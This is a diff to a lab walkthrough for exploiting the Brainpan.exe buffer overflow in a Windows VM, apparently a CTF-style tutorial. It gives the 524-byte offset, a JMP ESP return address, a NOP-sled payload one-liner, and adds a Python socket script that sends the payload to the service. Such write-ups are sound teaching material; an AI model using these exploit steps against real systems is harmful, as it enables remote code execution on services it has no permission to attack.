@@ -157,7 +157,23 @@ Next, we need to construct the entire payload with teh following simple Python s
 # the JMP ESP address: 0x311712f3 = "\xf3\x12\x17\x31" - it's backwards because of little-endian.
 python -c 'print "A" * 524 + "\xf3\x12\x17\x31" + "\x90" * (1024 - 524 - 4) + buf;
 ```
-Now, if we run this, it will print garbage to our screens, so we must employ Python to make the connection to the Windows VM Brainpan.exe service and send th payload for us. We do so with the followin easy Python script.
+Now, if we run this, it will print garbage to our screens, so we must employ Python to make the connection to the Windows VM Brainpan.exe service and send th payload for us. Let's being with a simple connect and send Python skeleton app which we will build out with our payload and buffer string later.
+```
+import socket as so # for the Socket object
+import sys # for exit() and arguments
+server=sys.argv[1] # the IP address a sthe first argument
+port=int(sys.argv[2]) # the port # as the second argument
+eipRetAddr = "" # or just jmpEsp
+buf = "" # the buffer of our payload
+payload = "" # the final, entire string to send to the service
+# Create a Socket object, called "s"
+s=so.socket(so.AF_INET,so.SOCK_STREAM)
+print "[*] Attempting to send payload to service ... \n"
+s.connect((server,port)) # Make the connection to the target
+s.send(payload + '\r\n') # send a carriage return and newline also
+print "[*] Script completed. \n"
+```
+Don't run this right away as it does not have a proper buffer overflow string. Finally, we add in our buffer and payload to send.
 ```
 import socket as so # for the Socket object
 import sys # for exit() and arguments
